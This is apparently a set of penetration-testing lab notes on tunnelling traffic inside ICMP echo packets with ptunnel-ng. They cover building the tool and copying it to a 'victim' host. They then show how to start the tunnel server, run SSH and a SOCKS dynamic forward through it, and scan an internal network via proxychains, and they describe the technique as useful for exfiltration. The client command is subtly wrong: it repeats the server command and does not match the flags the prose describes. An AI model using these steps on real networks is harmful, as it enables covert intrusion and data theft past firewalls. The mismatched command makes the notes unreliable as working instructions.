# ICMP Tunneling with SOCKS

---

ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

```shell-session
$ git clone https://github.com/utoni/ptunnel-ng.git
```

build tool

```shell-session
 sudo ./autogen.sh
```

Alternative approach of building a static binary

```shell-session
$ sudo apt install automake autoconf -y
$ cd ptunnel-ng/
$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
$ ./autogen.sh
```

`transfer ptunnel to victim`

```shell-session
$ scp  ptunnel ubuntu@10.129.202.64:~/
```

` method2: transfer whole repo`

```
$ scp  -r ptunnel-folder ubuntu@10.129.202.64:~/
```

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.

`Starting the ptunnel-ng Server on the Target Host`

```shell-session
$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.

Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

```
sudo ptunnel-ng/src/ptunnel-ng -r10.129.202.64 -R22
```

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

`confirm it worked by how the tunnel redirects traffic on port 2222 on localhost to the target'

```shell-session
$ ssh -p2222 -lubuntu 127.0.0.1
```

`add dynamic port forward to interact with internal networks`

```
 attc$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.
